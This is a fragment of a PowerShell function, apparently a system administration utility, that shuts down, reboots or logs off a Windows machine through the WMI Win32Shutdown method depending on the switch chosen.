            # If this area of code is invoked, it runs the command on the same machine the script is loaded
            if($Shutdown)
                {
                    $power_option = 5
                }
                elseif($Reboot)
                {
                    $power_option = 6
                }
                elseif($Logoff)
                {
                    $power_option = 4
                }
                else
                {
                    Write-Verbose "Not sure how you hit this unless you didn't provide a power options to do.  Please restart!"
                    exit
                }

                Write-Verbose "Connecting to $computer"
                (gwmi win32_operatingsystem).Win32Shutdown($power_option)
        }
    }
    end{}
}
